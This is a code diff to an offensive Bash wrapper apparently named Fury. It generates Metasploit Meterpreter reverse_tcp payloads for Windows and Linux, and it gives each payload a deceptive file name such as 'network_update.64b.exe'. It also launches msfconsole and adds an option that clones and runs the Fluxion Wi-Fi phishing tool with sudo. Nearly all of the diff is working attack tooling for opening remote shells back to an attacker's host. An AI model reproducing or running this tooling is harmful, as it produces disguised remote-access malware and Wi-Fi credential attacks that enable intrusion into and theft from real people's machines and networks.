@@ -4,7 +4,7 @@ readonly RED="\e[1;31m"
 readonly GREEN="\e[1;32m"
 readonly YELLOW="\e[1;33m"
 readonly RESET="\e[0m"
-readonly VERSION="v.0.0.5 bugfix"
+readonly VERSION="v.0.0.6"
 readonly NOTES="No notes available."
 
 echo -e "${RED}"
@@ -29,11 +29,13 @@ elif [ "$1" == "-h" ]; then
         echo "Use -u to view the usage of all options"
         echo "Use -gp to generate a payload"
         echo "Use -lc to launch the console"
+        echo "Use -lf to launch fluxtion"
         echo "-----------------------------------"
 elif [ "$1" == "-u" ]; then
         echo "-------------------------------------------------------------"
         echo "Usage for -gp: use the -gp flag and follow the instructions."
-        echo "Usage for -lc: use the -lc command and type your commands."
+        echo "Usage for -lc: use the -lc flag and type your commands."
+        echo "Usage for -lf: use the -lf flag to enter the fluxtion terminal (be sure that you are inside your fluxtion tool directory and don't worry if it isn't installed because Fury will install it automatically)."
         echo "-------------------------------------------------------------"
 elif [ "$1" == "-gp" ]; then
         read -p "Enter the operating system: " OS
@@ -45,21 +47,30 @@ elif [ "$1" == "-gp" ]; then
                 exit 1
         elif [ "$OS" == "windows" ] && [ "$architecture" == "x64" ]; then
                 echo -e "[*] Generating $OS $architecture payload...${RESET}"
-                mkdir payloads
+                if [ ! -d "payloads" ]; then
+                        mkdir payloads
+                fi
                 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f exe -o payloads/network_update.64b.exe
                 echo -e "${GREEN}[+] Payload generated!"
         elif [ "$OS" == "windows" ] && [ "$architecture" == "x86" ]; then
                 echo -e "[*] Generating $OS $architecture payload...${RESET}"
-                mkdir payloads
+                if [ ! -d "payloads" ]; then
+                        mkdir payloads
+                fi
                 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f exe -o payloads/network_update.32b.exe
                 echo -e "${GREEN}[+] Payload generated!"
         elif [ "$OS" == "linux" ] && [ "$architecture" == "x64" ]; then
                 echo -e "[*] Generating $OS $architecture payload...${RESET}"
-                mkdir payloads
+                if [ ! -d "payloads" ]; then
+                        mkdir payloads
+                fi
                 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f elf -o payloads/network_update.64b.elf
                 echo -e "${GREEN}[+] Payload generated!"
         elif [ "$OS" == "linux" ] && [ "$architecture" == "x86" ]; then
                 echo -e "[*] Generating $OS $architecture payload...${RESET}"
+                if [ ! -d "payloads" ]; then
+                        mkdir payloads
+                fi
                 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f elf -o payloads/network_update.32b.elf
                 echo -e "${GREEN}[+] Payload generated!"
         fi
@@ -67,6 +78,21 @@ elif [ "$1" == "-lc" ]; then
         echo -e "[*] Launching console...${RESET}"
         msfconsole
         echo -e "${YELLOW}[*] Console killed."
+elif [ "$1" == "-lf" ]; then
+        if [ -d "fluxion" ]; then
+                echo -e "${GREEN}[+] Launching flaxion...${RESET}"
+                cd fluxion
+                sudo ./fluxion.sh
+                echo -e "${YELLOW}[*] Fluxion closed."
+        else
+                echo -e "${RED}[!] Error. Fluxion not found. Press any key to stop the cloning repo...${RESET}"
+                read -t 5 -n 1 response
+                git clone https://github.com/FluxionNetwork/fluxion.git
+                echo -e "${GREEN}[+] Launching fluxion..."
+                cd fluxion
+                chmod +x fluxion.sh
+                sudo ./fluxion.sh -i
+        fi
 else
         echo -e "${RED}Error. Invalid flag. Try -h to view help." >&2
         exit 1
